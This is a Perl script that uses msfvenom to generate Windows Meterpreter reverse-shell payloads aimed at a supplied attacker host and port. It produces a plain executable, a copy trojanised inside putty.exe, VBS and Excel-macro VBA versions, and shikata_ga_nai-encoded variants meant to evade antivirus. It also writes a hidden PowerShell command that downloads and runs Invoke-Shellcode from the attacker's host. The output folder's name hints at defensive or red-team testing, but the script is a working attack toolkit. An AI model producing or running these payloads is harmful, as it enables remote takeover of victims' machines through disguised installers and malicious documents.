#!/usr/bin/perl
use strict;
use warnings;

  my($fileNdx, $LHOST, $LPORT, $targetFolder, $IoE);
  my($payload, $platform_arch , $commandControl );
  my($currentFileName, $encoder,$cmd, $OUTFILE);

  $targetFolder="/opt/local/malwaredefense";
  `mkdir -p $targetFolder`;
  $LHOST=$ARGV[0];  
  $LPORT=$ARGV[1]; 
  
  $fileNdx=0;
  $payload = '-p windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  $commandControl = "lhost=$LHOST lport=$LPORT";
  $encoder = "-e generic/none";
  
  print "If you want a clean slate, manually delete all files in $targetFolder\n\n";
  
  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/001-Stalwart-BasicMeterpreter.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/002-Stalwart-Meterpreter-packed-putty.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;

  
  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/003-Stalwart-Meterpreter.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/004-Stalwart-Meterpreter.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';

 $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/011-Stalwart-BasicMeterpreter.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/012-Stalwart-Meterpreter-packed-putty.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;

  
   $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/013-Stalwart-Meterpreter.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;
  

  #tuning encoder down to 3 for VBA
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/014-Stalwart-Meterpreter.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;


  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';


  print "Copy the Invoke-shellcode.ps1 to the target directory \n";
  print "Checking if PowerSploit is installed... \n";
  if (-d "/opt/PowerSploit") {
    print "PowerSploit is already installed \n";
  }
  else {
    print "Installing PowerSploit now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
  }
  my ($ShellCodePath) ="./701_Invoke-Shellcode.ps1";
  `cp $ShellCodePath $targetFolder/200_Invoke-Shellcode.ps1`;
  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/200_Invoke-Shellcode.ps1`;
  $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/200_Invoke-Shellcode.ps1'))";
  open( $OUTFILE, '>', "$targetFolder/201_PScommand.txt");
  print $OUTFILE $cmd;
  close $OUTFILE;
 
#Needs additional work
#  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
#  #`msfvenom ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
#  `msfvenom -p java/meterpreter/reverse_tcp ${platform_arch} ${commandControl} -f raw $encoder -o ${currentFileName}.jar`;
